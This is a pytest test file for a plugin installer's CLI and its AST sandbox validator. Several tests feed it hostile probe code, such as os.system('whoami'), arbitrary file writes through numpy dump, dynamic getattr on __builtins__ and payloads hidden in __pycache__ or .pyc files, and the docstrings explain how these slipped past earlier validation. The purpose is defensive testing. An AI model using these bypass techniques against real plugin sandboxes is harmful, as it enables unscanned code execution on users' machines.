"""Unit tests for scripts/plugins.py — source parsing, manifest validation, lockfile ops."""

from __future__ import annotations

import argparse
import io
import signal
import tarfile
from pathlib import Path
from textwrap import dedent

import pytest

try:
    import tomllib
except ModuleNotFoundError:  # pragma: no cover - exercised only on the 3.10 CI lane
    import tomli as tomllib  # 3.10 backport -- same API.

import plugins as plugin_cli
from app.core import plugin_loader
from app.core.plugin_validator import PluginValidationError
from app.core.plugins import catalog as core_catalog
from app.core.plugins import lifecycle


# ── parse_source ───────────────────────────────────────────────────────────

def test_parse_source_catalog_case_insensitive():
    # 'foundations' / 'deep' / 'rl' live in plugins/registry.json
    assert plugin_cli.parse_source("foundations") == ("catalog", "foundations", "", "")
    assert plugin_cli.parse_source("Foundations") == ("catalog", "foundations", "", "")
    assert plugin_cli.parse_source("RL") == ("catalog", "rl", "", "")


def test_parse_source_github_short_no_ref():
    assert plugin_cli.parse_source("alice/extras") == ("github", "alice", "extras", "")


def test_parse_source_github_short_with_ref():
    assert plugin_cli.parse_source("alice/extras@v1.2.3") == (
        "github", "alice", "extras", "v1.2.3",
    )


def test_parse_source_github_full_url():
    assert plugin_cli.parse_source("https://github.com/alice/extras") == (
        "github", "alice", "extras", "",
    )
    assert plugin_cli.parse_source("https://github.com/alice/extras.git") == (
        "github", "alice", "extras", "",
    )
    assert plugin_cli.parse_source("http://www.github.com/alice/extras") == (
        "github", "alice", "extras", "",
    )


def test_parse_source_rejects_garbage():
    with pytest.raises(ValueError):
        plugin_cli.parse_source("not a valid source spec")


def test_parse_source_names_the_example_from_the_catalog():
    # Hard-coding the example is how this line spent releases advertising "C2"
    # after that pack was renamed away.
    with pytest.raises(ValueError) as excinfo:
        plugin_cli.parse_source("not a valid source spec")
    example = sorted(plugin_cli.load_catalog()["plugins"])[0]
    assert f"e.g. {example}" in str(excinfo.value)


def test_parse_source_unknown_bare_name_lists_the_catalog(monkeypatch):
    # A bare word is unambiguously a catalog name, so saying "expected a catalog
    # name" back is a dead end: say which ones this install actually has.
    monkeypatch.setenv("CODEFYUI_LANG", "en")
    with pytest.raises(ValueError) as excinfo:
        plugin_cli.parse_source("edo")
    msg = str(excinfo.value)
    assert "No plugin pack named 'edo'" in msg
    for pack_id in plugin_cli.load_catalog()["plugins"]:
        assert pack_id in msg
    assert "cdui update" in msg  # the fix for the stale-install case


def test_parse_source_unknown_bare_name_flags_an_unreadable_catalog(monkeypatch):
    # An empty catalog fails every name, including the valid ones — say so
    # instead of blaming the name the user typed.
    monkeypatch.setenv("CODEFYUI_LANG", "en")
    monkeypatch.setattr(plugin_cli, "load_catalog", lambda: {"schema": 1, "plugins": {}})
    with pytest.raises(ValueError) as excinfo:
        plugin_cli.parse_source("foundations")
    msg = str(excinfo.value)
    assert "(none)" in msg
    assert str(plugin_cli._catalog_path()) in msg


def test_parse_source_bare_name_error_is_localized(monkeypatch):
    monkeypatch.setenv("CODEFYUI_LANG", "zh")
    with pytest.raises(ValueError) as excinfo:
        plugin_cli.parse_source("edo")
    # Not 「內建包」: the list under this heading is the whole catalog, and
    # three of its entries are repositories rather than packs shipped here.
    assert "目前可裝的套件" in str(excinfo.value)


def test_parse_source_accepts_every_catalog_pack():
    # Regression for the report that `cdui plugin install edu` "could not parse
    # plugin source" — every id the catalog ships must round-trip.
    for pack_id in plugin_cli.load_catalog()["plugins"]:
        assert plugin_cli.parse_source(pack_id) == ("catalog", pack_id, "", "")


# ── validate_manifest ──────────────────────────────────────────────────────

def _good_manifest(plugin_id: str = "test-pack") -> dict:
    return {"plugin": {"id": plugin_id, "name": "Test", "version": "0.0.1", "schema_version": 1}}


def test_validate_manifest_accepts_well_formed():
    plugin_cli.validate_manifest(_good_manifest())


def test_validate_manifest_rejects_missing_plugin_table():
    with pytest.raises(ValueError, match="\\[plugin\\]"):
        plugin_cli.validate_manifest({"content": {"nodes_dir": "nodes"}})


def test_validate_manifest_rejects_unknown_schema():
    bad = _good_manifest()
    bad["plugin"]["schema_version"] = 99
    with pytest.raises(ValueError, match="schema_version"):
        plugin_cli.validate_manifest(bad)


def test_validate_manifest_rejects_uppercase_id():
    bad = _good_manifest("CapsId")
    with pytest.raises(ValueError, match="Invalid plugin id"):
        plugin_cli.validate_manifest(bad)


def test_validate_manifest_rejects_trailing_dash_id():
    bad = _good_manifest("trailing-")
    with pytest.raises(ValueError, match="Invalid plugin id"):
        plugin_cli.validate_manifest(bad)


# ── validate_nodes_dir uses the AST validator on every .py ────────────────

def test_validate_nodes_dir_passes_clean_code(tmp_path):
    nodes = tmp_path / "nodes"
    nodes.mkdir()
    (nodes / "__init__.py").write_text("", encoding="utf-8")
    (nodes / "ok.py").write_text(
        "from app.core.node_base import BaseNode\n"
        "class X(BaseNode):\n"
        "    NODE_NAME = 'X'\n"
        "    CATEGORY = 'Test'\n"
        "    DESCRIPTION = ''\n",
        encoding="utf-8",
    )
    plugin_cli.validate_nodes_dir(nodes, allowed_modules=[])


def test_validate_nodes_dir_rejects_dangerous_import(tmp_path):
    nodes = tmp_path / "nodes"
    nodes.mkdir()
    (nodes / "bad.py").write_text("import os\nos.system('whoami')\n", encoding="utf-8")
    with pytest.raises(PluginValidationError):
        plugin_cli.validate_nodes_dir(nodes, allowed_modules=[])


def test_validate_nodes_dir_honours_allowed_modules(tmp_path):
    nodes = tmp_path / "nodes"
    nodes.mkdir()
    (nodes / "ok_with_pathlib.py").write_text(
        "from pathlib import Path\np = Path('/tmp')\n", encoding="utf-8"
    )
    # pathlib is in the default blocklist; allow_modules opens it back up.
    plugin_cli.validate_nodes_dir(nodes, allowed_modules=["pathlib"])


def test_validate_nodes_dir_allows_getattr_with_literal(tmp_path):
    """`getattr(obj, "literal")` is the common idiom for optional attrs —
    refining the AST gate so plugins that just want `getattr(context,
    "verbose", False)` aren't false-positived."""
    nodes = tmp_path / "nodes"
    nodes.mkdir()
    (nodes / "verbose_check.py").write_text(
        "def f(context):\n"
        "    return getattr(context, 'verbose', False)\n",
        encoding="utf-8",
    )
    plugin_cli.validate_nodes_dir(nodes, allowed_modules=[])


def test_validate_nodes_dir_rejects_dynamic_getattr(tmp_path):
    """Dynamic attribute names — the actual sandbox-bypass shape — stay blocked."""
    nodes = tmp_path / "nodes"
    nodes.mkdir()
    (nodes / "bad.py").write_text(
        "def f(name):\n"
        "    return getattr(__builtins__, name)\n",
        encoding="utf-8",
    )
    with pytest.raises(PluginValidationError):
        plugin_cli.validate_nodes_dir(nodes, allowed_modules=[])


# ── core#179: a library VALUE's own method escapes import-time gating ──────

def test_validate_nodes_dir_rejects_numpy_dump_to_an_arbitrary_path(tmp_path):
    """``numpy.zeros(3).dump(path)`` pickles straight to any path the file
    names, with substantially attacker-chosen content
    (``numpy.frombuffer(payload, dtype=numpy.uint8).dump(p)`` embeds the
    payload verbatim after a fixed pickle prefix) -- arbitrary file WRITE,
    zero capability declared.

    ``numpy`` is Tier 0 (``TIER0_PURE_COMPUTE_MODULES``), so ``import numpy``
    needs no declaration at all, and the import-time capability gate only
    ever looks at module names on ``Import`` nodes -- it never inspects what
    a Tier-0-allowed library hands back. ``.dump`` is already closed for
    in-canvas scripts via ``script_policy.TIER0_DENIED_ATTRS`` passed as
    ``denied_attributes``; this proves the same mechanism is wired into the
    installed-plugin surface, not just re-implemented for one leaf.
    """
    nodes = tmp_path / "nodes"
    nodes.mkdir()
    (nodes / "bad.py").write_text(
        "import numpy\n"
        "def pwn(path):\n"
        "    numpy.zeros(3).dump(path)\n",
        encoding="utf-8",
    )
    with pytest.raises(PluginValidationError):
        plugin_cli.validate_nodes_dir(nodes, allowed_modules=[])


def test_validate_plugin_dir_rejects_numpy_dump_to_an_arbitrary_path(tmp_path):
    """Same escape, the other entry point: ``validate_plugin_dir`` walks the
    whole extracted tarball (not only ``nodes/``) and has to close the same
    door -- it is a separate call to ``validate_python_source`` and does not
    inherit whatever ``validate_nodes_dir`` was told."""
    root = tmp_path / "pack"
    (root / "nodes").mkdir(parents=True)
    (root / "nodes" / "bad.py").write_text(
        "import numpy\n"
        "def pwn(path):\n"
        "    numpy.zeros(3).dump(path)\n",
        encoding="utf-8",
    )
    with pytest.raises(PluginValidationError):
        plugin_cli.validate_plugin_dir(root, [])


@pytest.mark.parametrize(
    "label,source",
    [
        ("own method: self.save(path)",
         "class X:\n    def pwn(self, path):\n        self.save(path)\n"),
        ("own method: self.dump(x)",
         "class X:\n    def pwn(self, x):\n        self.dump(x)\n"),
        ("keras-ish: model.save(p)",
         "def pwn(model, p):\n    model.save(p)\n"),
        ("torch.distributed.init_process_group",
         "import torch\ndef pwn():\n    torch.distributed.init_process_group('gloo')\n"),
        ("torch.hub.download_url_to_file",
         "import torch\ndef pwn():\n    torch.hub.download_url_to_file('x', 'y')\n"),
        ("torch.onnx.export",
         "import torch\ndef pwn(model, x, p):\n    torch.onnx.export(model, x, p)\n"),
    ],
)
def test_denied_attributes_is_refused_at_tier0_but_liftable_at_tier2(
    tmp_path, label, source
):
    """core#179 follow-up: closing these at Tier 0/1 is right (a plugin that
    declared nothing, or only a capability, gets no new file-write / remote-
    fetch-and-execute surface for free) -- refusing them at Tier 2 is
    incoherent. ``--trust-author`` already hands over ``subprocess``,
    ``ctypes`` and ``importlib``; a plugin trusted with those but refused
    ``arr.dump()`` or its OWN ``self.save()`` method makes no sense, and
    before this fix there was no way to write a plugin with a method named
    ``save`` at all -- the only fix available to the author was patching
    CodefyUI itself.

    The dunder/RCE precedent does not transfer here: those rules refuse
    REFLECTION, which no capability ever buys (core#133's own docs are
    explicit about this). ``.dump`` / ``.hub`` / ``.save`` are not
    reflection -- they are file writes and remote code fetches,
    ``--trust-author`` has already granted an equivalent or greater version
    of that by a shorter route (``subprocess`` can write files and fetch
    code far more directly than ``numpy.save`` can), so refusing the
    narrower path while granting the wider one protects nothing.
    """
    nodes = tmp_path / "nodes"
    nodes.mkdir()
    (nodes / "n.py").write_text(source, encoding="utf-8")

    # Tier 0/1: nothing declared beyond (at most) a capability -- refused.
    with pytest.raises(PluginValidationError):
        plugin_cli.validate_nodes_dir(nodes, allowed_modules=[])

    # Tier 2: --trust-author (modelled here as a non-empty allowed_modules,
    # exactly the condition validate_nodes_dir/validate_plugin_dir's callers
    # gate on -- see _install_github, which never calls either function with
    # a non-empty `allowed` unless args.trust_author was already true)
    # accepts it.
    plugin_cli.validate_nodes_dir(nodes, allowed_modules=["torch"])


def test_denied_attributes_lift_also_applies_to_validate_plugin_dir(tmp_path):
    """Same Tier-2 lift, the other entry point -- a separate call to
    ``validate_python_source`` that must not drift from what
    ``validate_nodes_dir`` does."""
    root = tmp_path / "pack"
    (root / "nodes").mkdir(parents=True)
    (root / "nodes" / "n.py").write_text(
        "class X:\n    def pwn(self, path):\n        self.save(path)\n",
        encoding="utf-8",
    )
    with pytest.raises(PluginValidationError):
        plugin_cli.validate_plugin_dir(root, [])
    plugin_cli.validate_plugin_dir(root, ["torch"])


# ── core#182: a skipped directory is still importable at runtime ───────────

@pytest.mark.parametrize(
    "skipped_dir", ["tests", "examples", "assets", "docs", "__pycache__"]
)
def test_validate_plugin_dir_scans_directories_the_loader_can_still_import(
    tmp_path, skipped_dir
):
    """``plugin_loader.install_plugin_finder`` registers the WHOLE plugin
    root as a PEP-420 namespace package's ``__path__`` (not just ``nodes/``),
    so ``cdui_plugins.<id>.tests``, ``.examples``, ``.docs``, ``.assets`` --
    and ``.__pycache__`` -- are all importable -- a scanned ``nodes/foo.py``
    doing ``from ..tests import payload`` executes whatever is in ``tests/``
    at full trust, automatically, at server boot or plugin reload.

    ``_VALIDATION_SKIP_DIRS`` used to carve exactly these five names back out
    of the scan that ``validate_plugin_dir``'s own docstring says was widened
    to whole-tree specifically because the loader exposes the whole
    directory -- reopening the same hole the widening had just closed. The
    scan's view of "what is in-tree" has to match the loader's, so nothing
    admits code the AST gate never looked at.

    ``__pycache__`` belongs in this list, not the "genuinely non-importable"
    one below: it reads as safe only if you reason about what a REAL
    ``__pycache__`` holds (``.pyc`` files, which never match this walk's own
    ``*.py`` glob). That reasoning is about the wrong actor -- the directory
    the interpreter writes is irrelevant here, because the attacker controls
    every byte of the tarball and can name any directory ``__pycache__`` on
    purpose. ``__pycache__`` IS a valid Python identifier
    (``"__pycache__".isidentifier()`` is ``True``), so PEP-420 namespace
    resolution imports it exactly like any other directory name. Verified
    directly against the real loader (not merely argued): with a plugin
    installed via ``install_plugin_finder``, both
    ``importlib.import_module("cdui_plugins.<id>.__pycache__.payload")`` and
    a relative ``from ..__pycache__ import payload`` inside ``nodes/``
    resolve to the file placed there.
    """
    root = tmp_path / "pack"
    (root / "nodes").mkdir(parents=True)
    (root / "nodes" / "__init__.py").write_text("", encoding="utf-8")
    (root / skipped_dir).mkdir(parents=True)
    (root / skipped_dir / "payload.py").write_text(
        "import os\nos.system('whoami')\n", encoding="utf-8"
    )
    with pytest.raises(PluginValidationError):
        plugin_cli.validate_plugin_dir(root, [])


def test_pycache_is_a_valid_python_identifier_unlike_git():
    """The property the split between the two tests here rests on, checked
    structurally rather than assumed: ``__pycache__`` is an ordinary
    identifier (any ``import`` statement can name it) and ``.git`` is not
    (the leading ``.`` makes it a syntax error as an import-path component),
    which is the actual reason one of them has to be scanned and the other
    provably cannot be reached through Python's import system at all."""
    assert "__pycache__".isidentifier()
    assert not ".git".isidentifier()


def test_validate_plugin_dir_still_skips_the_one_genuinely_unreachable_dir(tmp_path):
    """``.git`` is the only name left in ``_VALIDATION_SKIP_DIRS``, and it
    stays there because it is PROVABLY unreachable through Python's import
    system, not merely assumed to be: ``.git`` is not a valid identifier (see
    ``test_pycache_is_a_valid_python_identifier_unlike_git``), so no
    ``import`` statement -- absolute or relative -- can ever name a package
    component spelled that way. ``__pycache__`` no longer gets this
    exemption; see the parametrized test above for why "looks like an
    implementation-detail directory" was never the same claim as "cannot be
    imported"."""
    root = tmp_path / "pack"
    (root / "nodes").mkdir(parents=True)
    (root / "nodes" / "__init__.py").write_text("", encoding="utf-8")
    (root / ".git").mkdir(parents=True)
    (root / ".git" / "payload.py").write_text(
        "import os\nos.system('whoami')\n", encoding="utf-8"
    )
    plugin_cli.validate_plugin_dir(root, [])  # does not raise


# ── core#220: the scan globbed *.py, the loader imports more ──────────────
#
# core#182 established the property "what the scan considers in-tree matches
# what the loader can import" and enforced it by DIRECTORY. The same property
# was broken by file EXTENSION one layer down, and this is the worse half:
# core#182's gap meant unscanned code in a directory the walk skipped, while
# this one meant the walk never produced a single file to scan. The gate did
# not fail open on a rule -- it never ran.


def _plugin_with(tmp_path, filename: str, payload: bytes) -> Path:
    """A minimal plugin tree whose ``nodes/`` holds one extra file."""
    root = tmp_path / "pack"
    (root / "nodes").mkdir(parents=True)
    (root / "nodes" / "__init__.py").write_text("", encoding="utf-8")
    (root / "nodes" / filename).write_bytes(payload)
    return root


@pytest.mark.parametrize(
    ("filename", "suffix"),
    [
        ("helper.pyc", ".pyc"),
        ("helper.pyo", ".pyo"),
        ("native.pyd", ".pyd"),
        ("native.so", ".so"),
        ("native.dylib", ".dylib"),
    ],
)
def test_validate_plugin_dir_refuses_compiled_modules_it_cannot_scan(
    tmp_path, filename, suffix
):
    """A plugin shipping a compiled module is refused BY NAME, loudly.

    Before this, ``validate_plugin_dir`` globbed ``*.py`` while
    ``plugin_loader.install_plugin_finder`` handed the whole plugin
    directory to the stock ``FileFinder`` loaders, which accept every suffix
    in ``importlib.machinery.all_suffixes()``. A pack whose ``nodes/`` held
    ``helper.pyc`` and no ``helper.py`` was imported by
    ``NodeRegistry.discover`` at server boot -- at full trust, with no
    capability declared and without ``--trust-author`` -- having never been
    opened by the gate.

    Refusal rather than scanning is the honest answer for both kinds:
    ``.pyc`` would need decompiling, and a ``.pyd`` / ``.so`` cannot be
    AST-scanned even in principle. The alternative is importing code nobody
    looked at, which is the thing this whole module exists to prevent.

    The binary suffixes of OTHER platforms are refused too. A tarball is not
    installed on the machine that built it, so a verdict that depended on
    which OS ran the installer would be a verdict an attacker picks.
    """
    root = _plugin_with(tmp_path, filename, b"\x00\x01\x02 not source")
    with pytest.raises(PluginValidationError) as excinfo:
        plugin_cli.validate_plugin_dir(root, [])
    message = str(excinfo.value)
    assert filename in message, "the refusal must name the file"
    assert suffix in message, "the refusal must name why it could not be scanned"


def test_the_refused_bytecode_really_is_importable(tmp_path):
    """Non-vacuity for the test above: prove the file it refuses is a file
    the import system would genuinely have loaded, rather than a shape that
    only looks dangerous.

    Compiles a real payload to bytecode, deletes the source, and checks that
    ``pkgutil`` -- the same enumeration ``NodeRegistry.discover`` walks with
    -- reports it as an importable module while a ``*.py`` glob sees
    nothing. Without this, the refusal could be guarding a phantom.
    """
    import pkgutil
    import py_compile

    root = tmp_path / "pack"
    nodes = root / "nodes"
    nodes.mkdir(parents=True)
    (nodes / "__init__.py").write_text("", encoding="utf-8")
    src = nodes / "payload_src.py"
    src.write_text("import os\nos.system('whoami')\n", encoding="utf-8")
    py_compile.compile(str(src), cfile=str(nodes / "helper.pyc"), doraise=True)
    src.unlink()

    scanned_by_the_old_glob = sorted(p.name for p in root.rglob("*.py"))
    importable = sorted(m.name for m in pkgutil.iter_modules([str(nodes)]))
    assert "helper" in importable, (
        "the premise of core#220: pkgutil (what NodeRegistry.discover walks) "
        "reports the bytecode-only module as importable"
    )
    assert scanned_by_the_old_glob == ["__init__.py"], (
        "the other half of the premise: a *.py glob never sees it"
    )
    with pytest.raises(PluginValidationError):
        plugin_cli.validate_plugin_dir(root, [])


def test_validate_plugin_dir_scans_pyw_as_the_source_it_is(tmp_path):
    """``.pyw`` is a loader suffix and is ordinary Python text, so it is
    SCANNED rather than refused -- refusing it would be a false positive,
    and skipping it was the bug.

    Scanned on every platform, not only where ``SOURCE_SUFFIXES`` lists it.
    ``.pyw`` is Windows-only as a loader suffix, so a scan running on Linux
    would otherwise wave through a file that a Windows install of the same
    tarball imports.
    """
    root = _plugin_with(tmp_path, "w.pyw", b"import os\nos.system('whoami')\n")
    with pytest.raises(PluginValidationError) as excinfo:
        plugin_cli.validate_plugin_dir(root, [])
    assert "Importing 'os' is not allowed" in str(excinfo.value), (
        "a .pyw should reach the ordinary AST rules, not the refuse-by-suffix "
        "path -- it is source"
    )

    clean = _plugin_with(tmp_path / "ok", "w.pyw", b"VALUE = 1\n")
    plugin_cli.validate_plugin_dir(clean, [])   # does not raise


def test_the_scan_covers_every_suffix_the_import_system_accepts(tmp_path):
    """The standing check core#220 asks for: a future CPython that adds a
    loader suffix fails here instead of silently widening the hole.

    Asked of the interpreter (``importlib.machinery.all_suffixes()``) rather
    than compared against a copy of today's answer, and asserted on
    BEHAVIOUR rather than on set membership -- every suffix gets a real file
    written under a real plugin root, and the walk has to do one of exactly
    two things with it: scan it as source, or refuse it by name. A third
    outcome, "walked straight past it", is the state this closed, and a
    membership check would not have distinguished the third from the second.
    """
    import importlib.machinery

    accepts = set(importlib.machinery.all_suffixes())
    assert accepts <= plugin_cli.LOADER_SUFFIXES, (
        "this interpreter's import system accepts suffixes the plugin scan "
        f"does not consider: {sorted(accepts - plugin_cli.LOADER_SUFFIXES)}"
    )
    assert set(importlib.machinery.SOURCE_SUFFIXES) <= plugin_cli.SCANNABLE_SUFFIXES

    for index, suffix in enumerate(sorted(accepts | plugin_cli.LOADER_SUFFIXES)):
        root = _plugin_with(
            tmp_path / f"probe{index}",
            "probe" + suffix,
            b"import os\nos.system('whoami')\n",
        )
        with pytest.raises(PluginValidationError) as excinfo:
            plugin_cli.validate_plugin_dir(root, [])
        message = str(excinfo.value)
        if suffix in plugin_cli.SCANNABLE_SUFFIXES:
            assert "Importing 'os' is not allowed" in message, (
                f"{suffix!r} is source, so it must reach the AST rules"
            )
        else:
            assert suffix in message and "probe" in message, (
                f"{suffix!r} cannot be scanned, so the refusal must name the "
                f"file and say why -- silence is the core#220 bug"
            )


def test_longest_suffix_wins_so_a_versioned_extension_is_still_refused(tmp_path):
    """``native.cp314-win_amd64.pyd`` ends with two loader suffixes, and
    picking the short one would defeat the refusal.

    Strip only ``.pyd`` and the stem is ``native.cp314-win_amd64``, which is
    not an identifier -- so the "can an import statement name this?" screen
    would skip it, and a real compiled extension (the exact filename
    ``setuptools`` produces) would sail through unexamined. Strip the full
    ``.cp314-win_amd64.pyd`` and the stem is ``native``, which it can.
    """
    import importlib.machinery

    versioned = importlib.machinery.EXTENSION_SUFFIXES[0]
    root = _plugin_with(tmp_path, "native" + versioned, b"\x00binary")
    assert plugin_cli.loader_suffix(
        root / "nodes" / ("native" + versioned)
    ) == versioned, "longest match must win"
    with pytest.raises(PluginValidationError):
        plugin_cli.validate_plugin_dir(root, [])


def test_a_cpython_written_bytecode_cache_is_not_mistaken_for_a_payload(tmp_path):
    """The false positive the refusal must NOT produce.

    Any plugin directory an interpreter has ever imported from carries a
    ``__pycache__`` full of ``<name>.cpython-NNN.pyc`` -- this repo's own
    built-in packs included, which is how this surfaced. Those are not
    reachable by any import statement: strip ``.pyc`` and the stem is
    ``real.cpython-314``, which is not a valid identifier, so no import can
    name it. An attacker-placed ``payload.pyc`` in the SAME directory has
    the stem ``payload``, which is.

    Verified rather than argued, because the distinction carries the whole
    rule: with a plugin exposed through the real loader,
    ``import <pkg>.nodes.__pycache__.payload`` ran the planted bytecode
    while ``import <pkg>.nodes.__pycache__.real`` raised
    ``ModuleNotFoundError``, and ``pkgutil.iter_modules`` listed only the
    first. So the refusal fires on the one that is reachable and stays quiet
    on the one that is not -- the same structural test ``.git`` gets, applied
    to a filename instead of a directory name.
    """
    import py_compile

    root = tmp_path / "pack"
    nodes = root / "nodes"
    cache = nodes / "__pycache__"
    cache.mkdir(parents=True)
    (nodes / "__init__.py").write_text("", encoding="utf-8")
    (nodes / "real.py").write_text("VALUE = 1\n", encoding="utf-8")
    py_compile.compile(str(nodes / "real.py"), doraise=True)

    artifacts = sorted(p.name for p in cache.iterdir())
    assert artifacts, "py_compile should have written a cache file"
    for name in artifacts:
        assert not name[: -len(".pyc")].isidentifier(), (
            f"{name} is CPython's own cache artifact; the premise of this "
            "test is that its stem is unspellable as a module name"
        )
    plugin_cli.validate_plugin_dir(root, [])   # does not raise

    # ...and the same directory with an attacker-named file in it does raise.
    py_compile.compile(
        str(nodes / "real.py"), cfile=str(cache / "payload.pyc"), doraise=True
    )
    with pytest.raises(PluginValidationError) as excinfo:
        plugin_cli.validate_plugin_dir(root, [])
    assert "payload.pyc" in str(excinfo.value)


def test_validate_nodes_dir_refuses_the_same_compiled_module(tmp_path):
    """The other entry point. ``validate_nodes_dir`` is a separate call into
    the walker and used to carry its own ``*.py`` glob, so a fix applied to
    one of the two would have left the narrower one open."""
    nodes = tmp_path / "nodes"
    nodes.mkdir()
    (nodes / "helper.pyc").write_bytes(b"\x00\x01 not source")
    with pytest.raises(PluginValidationError):
        plugin_cli.validate_nodes_dir(nodes, [])


def test_the_git_directory_exemption_survives_the_suffix_rule(tmp_path):
    """``.git`` holds loose objects and packfiles with arbitrary names, and
    it is skipped for a structural reason that the suffix rule must not
    quietly undo: ``.git`` is not a valid identifier, so no import can name
    a component spelled that way (core#182). A ``.pyc`` planted in there is
    still unreachable."""
    root = tmp_path / "pack"
    (root / "nodes").mkdir(parents=True)
    (root / "nodes" / "__init__.py").write_text("", encoding="utf-8")
    (root / ".git").mkdir(parents=True)
    (root / ".git" / "payload.pyc").write_bytes(b"\x00\x01 not source")
    plugin_cli.validate_plugin_dir(root, [])   # does not raise


# ── load_catalog ────────────────────────────────────────────────────────────

def test_load_catalog_returns_three_direction_packs():
    catalog = plugin_cli.load_catalog()
    plugins = catalog.get("plugins", {})
    assert set(plugins.keys()) >= {"foundations", "deep", "rl"}
    for pid in ("foundations", "deep", "rl"):
        assert plugins[pid].get("kind") == "builtin"
        assert plugins[pid].get("path") == f"plugins/{pid}"


# ── _install_deps spec construction ───────────────────────────────────────

def test_install_deps_builds_correct_pip_specs(monkeypatch):
    """The specs are captured from the runner the install actually uses.

    ``_install_deps`` is a front end over ``deps.install_deps_step``, which
    runs ``packs.runner.run_pip`` under a constraints file rather than
    shelling out to ``uv`` itself -- so the fake is that runner, and it is
    also what keeps this test from installing four packages.
    """
    captured: list[list[str]] = []

    def fake_run_pip(specs, *, constraints_path, emit, cancel_check, cwd,
                     tail=None):
        captured.append(list(specs))
        # The step reads this to decide whether the install worked; the
        # constraints file is a real one written for this call, which is the
        # part that makes the install add-only.
        assert constraints_path.exists()
        return 0

    monkeypatch.setattr("app.core.packs.runner.run_pip", fake_run_pip)

    rc = plugin_cli._install_deps({
        "foo": ">=1.0",         # version constraint passes through
        "bar": "==2.3.4",       # explicit equality
        "baz": "1.0.0",         # bare version → coerced to ==1.0.0
        "qux": "",              # no constraint
    })
    assert rc == 0
    assert captured, "uv pip install should have been invoked"
    specs = captured[0]
    assert "foo>=1.0" in specs
    assert "bar==2.3.4" in specs
    assert "baz==1.0.0" in specs
    assert "qux" in specs


def test_install_deps_reports_a_resolver_conflict_as_exit_3(monkeypatch, capsys):
    """`cdui plugin link` is the live caller, and it propagates this code.

    A linked plugin's packages go through the same add-only step a
    downloaded one's do, so they hit the same wall: uv would have to replace
    a package this process is holding open. That is "not while the server is
    running", not "the plugin is broken", and the command to run instead is
    printed rather than described.
    """
    monkeypatch.setenv("CODEFYUI_LANG", "en")

    def _conflicted(specs, *, constraints_path, emit, cancel_check, cwd,
                    tail=None):
        if tail is not None:
            tail.append("  x No solution found when resolving dependencies:")
        return 1

    monkeypatch.setattr("app.core.packs.runner.run_pip", _conflicted)

    assert plugin_cli._install_deps({"tabulate": ">=0.9"}) == 3
    printed = _out(capsys)
    assert "uv pip install" in printed
    assert "tabulate>=0.9" in printed


# ── _manifest_has_frontend ────────────────────────────────────────────────

def test_manifest_has_frontend_detection():
    assert plugin_cli._manifest_has_frontend({"frontend": {"entry": "frontend/index.js"}}) is True
    assert plugin_cli._manifest_has_frontend({}) is False
    assert plugin_cli._manifest_has_frontend({"frontend": {}}) is False
    assert plugin_cli._manifest_has_frontend({"frontend": {"entry": ""}}) is False


# ── link / unlink / reload (local dev loop) ────────────────────────────────

@pytest.fixture
def isolated_lockfile(tmp_path, monkeypatch):
    """Redirect the lockfile to a temp dir and stub the server hot-reload so
    CLI tests never touch real user data or a running server.

    ``plugins_user_root`` is patched in BOTH modules on purpose:
    ``scripts/plugins.py`` imported the name, so it holds its own reference,
    and patching only ``plugin_loader``'s would move the lockfile while
    leaving any install path writing files into the real user data dir.
    """
    target = tmp_path / "plugins"
    target.mkdir()
    monkeypatch.setattr(plugin_loader, "plugins_user_root", lambda: target)
    monkeypatch.setattr(plugin_cli, "plugins_user_root", lambda: target)
    monkeypatch.setattr(plugin_cli, "_backend_reload", lambda: False)
    return target


def _write_plugin_dir(root: Path, plugin_id: str) -> None:
    root.mkdir(parents=True, exist_ok=True)
    (root / "cdui.plugin.toml").write_text(
        dedent(f"""\
            [plugin]
            id = "{plugin_id}"
            name = "Local {plugin_id}"
            version = "0.1.0"
            schema_version = 1
            """),
        encoding="utf-8",
    )
    nodes = root / "nodes"
    nodes.mkdir(exist_ok=True)
    (nodes / "__init__.py").write_text("", encoding="utf-8")


def test_cmd_link_writes_local_lockfile_entry(isolated_lockfile, tmp_path):
    work = tmp_path / "work" / "my-dev-plugin"
    _write_plugin_dir(work, "my-dev-plugin")

    rc = plugin_cli.cmd_link(argparse.Namespace(path=str(work), force=False))
    assert rc == 0

    entry = plugin_loader.load_lockfile()["plugins"]["my-dev-plugin"]
    assert entry["source_kind"] == "local"
    assert Path(entry["path"]) == work.resolve()
    assert entry["enabled"] is True


def test_cmd_link_rejects_dir_without_manifest(isolated_lockfile, tmp_path):
    empty = tmp_path / "empty"
    empty.mkdir()
    rc = plugin_cli.cmd_link(argparse.Namespace(path=str(empty), force=False))
    assert rc == 1
    assert plugin_loader.load_lockfile()["plugins"] == {}


def test_cmd_link_rejects_catalog_id_collision(isolated_lockfile, tmp_path):
    work = tmp_path / "shadow"
    _write_plugin_dir(work, "foundations")  # a real built-in catalog id
    rc = plugin_cli.cmd_link(argparse.Namespace(path=str(work), force=False))
    assert rc == 1
    assert "foundations" not in plugin_loader.load_lockfile()["plugins"]


def test_cmd_link_accepts_a_github_catalog_id(isolated_lockfile, tmp_path):
    """Linking is how the author of an official plugin works on it.

    The catalog lists CodefyUI-Plugin-Official under ``official-template``,
    and a clone of that repository carries exactly that id in its manifest --
    so a refusal keyed on "is this id in the catalog" would have made
    ``cdui plugin link ./CodefyUI-Plugin-Official``, the documented dev loop,
    impossible the moment the pack entered the catalog. There is no
    repository to compare a local directory against and none is wanted: a
    link points at the developer's own working tree, and nothing is
    downloaded or trusted on the strength of the name.
    """
    work = tmp_path / "CodefyUI-Plugin-Official"
    _write_plugin_dir(work, "official-template")
    rc = plugin_cli.cmd_link(argparse.Namespace(path=str(work), force=False))
    assert rc == 0
    entry = plugin_loader.load_lockfile()["plugins"]["official-template"]
    assert entry["source_kind"] == "local"
    assert Path(entry["path"]) == work.resolve()


@pytest.mark.parametrize(
    ("plugin_id", "why"),
    [
        ("stats", "a pack that ships with CodefyUI"),
        ("catalog", "a route under /api/plugins/"),
    ],
)
def test_cmd_link_still_rejects_an_id_this_build_owns(
    isolated_lockfile, tmp_path, capsys, monkeypatch, plugin_id, why
):
    """The half of the rule a local link does not get to bend: a built-in
    pack's files ship in this repository and are activated in place, and a
    route name is answered by the router, so in both cases something other
    than the lockfile would decide what the id meant."""
    monkeypatch.setenv("CODEFYUI_LANG", "en")
    work = tmp_path / f"shadow-{plugin_id}"
    _write_plugin_dir(work, plugin_id)
    rc = plugin_cli.cmd_link(argparse.Namespace(path=str(work), force=False))
    assert rc == 1
    assert plugin_loader.load_lockfile()["plugins"] == {}
    printed = capsys.readouterr()
    assert why in printed.out + printed.err


